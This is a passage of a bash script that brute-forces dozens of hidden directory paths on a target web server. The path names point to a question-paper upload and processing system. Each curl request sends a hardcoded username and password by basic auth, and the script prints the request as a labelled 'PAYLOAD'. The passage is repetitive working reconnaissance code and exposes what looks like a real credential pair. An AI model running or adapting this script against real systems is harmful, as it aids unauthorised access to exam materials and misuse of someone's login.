" "${target}QPB_FileUpload/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPB_FileUpload/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Suite-QPBData/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Suite-QPBData/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Suite-QPBData/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPDatabaseFileProcessor/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPDatabaseFileProcessor/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPDatabaseFileProcessor/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPHandler-Service/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPHandler-Service/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPHandler-Service/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BatchUpload_QPaperDoc/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BatchUpload_QPaperDoc/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BatchUpload_QPaperDoc/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUpload_Automation/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUpload_Automation/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUpload_Automation/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [UploadService-QPaper/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}UploadService-QPaper/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}UploadService-QPaper/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QstnPaperHandler/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QstnPaperHandler/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QstnPaperHandler/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPFileAutomation/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPFileAutomation/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPFileAutomation/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPWorkflow_BatchUpload/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPWorkflow_BatchUpload/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPWorkflow_BatchUpload/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBData_Processing/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBData_Processing/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBData_Processing/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMonitorCloudSync/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMonitorCloudSync/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMonitorCloudSync/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [FileProcessor-QPMonitor/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}FileProcessor-QPMonitor/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}FileProcessor-QPMonitor/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUpload_Service/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUpload_Service/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUpload_Service/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPService_DataOps/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPService_DataOps/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPService_DataOps/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AutomationSystem-QPaperDoc/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AutomationSystem-QPaperDoc/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AutomationSystem-QPaperDoc/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ProcessingSystem_QPMaster/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ProcessingSystem_QPMaster/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ProcessingSystem_QPMaster/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBulk-DataOps/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBulk-DataOps/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBulk-DataOps/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPSystem-BulkUpload/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPSystem-BulkUpload/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPSystem-BulkUpload/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPWorkflow_Sync/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPWorkflow_Sync/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPWorkflow_Sync/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPProcessingWorkflow/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPProcessingWorkflow/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPProcessingWorkflow/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [SyncQPAdmin/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}SyncQPAdmin/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}SyncQPAdmin/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ProcessingQPUploader/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ProcessingQPUploader/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ProcessingQPUploader/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Workflow_QPSystem/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Workflow_QPSystem/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Workflow_QPSystem/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ProcessingSuite_QPB/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ProcessingSuite_QPB/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ProcessingSuite_QPB/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBDataFileUpload/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBDataFileUpload/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBDataFileUpload/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Module-QPWorkflow/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Module-QPWorkflow/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Module-QPWorkflow/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MonitoringTool_QPBData/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MonitoringTool_QPBData/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MonitoringTool_QPBData/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPB_DataOps/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPB_DataOps/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPB_DataOps/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUploaderTool/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUploaderTool/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUploaderTool/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BatchUpload_QPUpload/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BatchUpload_QPUpload/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BatchUpload_QPUpload/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUploader-DatabaseManager/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUploader-DatabaseManager/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUploader-DatabaseManager/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Uploader_QPBatch/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Uploader_QPBatch/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Uploader_QPBatch/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaper_System/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaper_System/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaper_System/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBData_Handler/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBData_Handler/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBData_Handler/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Handling_QsnPaper/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Handling_QsnPaper/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Handling_QsnPaper/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPB_Portal/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPB_Portal/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPB_Portal/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPProcessing_ProcessingSuite/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPProcessing_ProcessingSuite/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPProcessing_ProcessingSuite/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Processing_QPMonitor/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Processing_QPMonitor/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Processing_QPMonitor/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MassUploadQPaperDoc/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MassUploadQPaperDoc/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MassUploadQPaperDoc/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataSync_QPDatabase/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataSync_QPDatabase/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataSync_QPDatabase/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [CloudSyncQPB/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
